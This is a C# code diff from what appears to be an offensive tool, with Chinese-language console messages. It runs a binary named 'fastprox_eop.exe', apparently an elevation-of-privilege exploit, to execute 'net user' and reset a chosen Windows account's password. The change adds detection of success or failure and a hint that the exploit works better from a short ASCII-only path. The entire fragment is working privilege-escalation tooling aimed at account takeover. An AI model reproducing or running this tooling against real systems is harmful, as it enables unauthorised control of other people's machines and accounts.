@@ -45,9 +45,17 @@ while (true)
         string newPassword = Console.ReadLine();
         try
         {
-            ProcessStartInfo psi = new("fastprox_eop.exe", $"--cmd \"net user \"{username}\" \"{newPassword}\"\" --out \"result-{Guid.NewGuid()}.txt\"");
+            string outpath = $"result-{Guid.NewGuid()}.txt";
+            ProcessStartInfo psi = new("fastprox_eop.exe", $"--cmd \"net user \"{username}\" \"{newPassword}\"\" --out \"{outpath}\"");
             Process.Start(psi).WaitForExit();
-            FluentConsole.Green.Line($"[+] 执行成功");
+            if (File.Exists(outpath))
+            {
+                FluentConsole.Green.Line($"[+] 执行成功");
+            }
+            else
+            {
+                FluentConsole.Yellow.Line($"[!] 执行失败。将应用程序放在路径短且全ASCII的目录成功率更高");
+            }
         }
         catch (Exception ex)
         {
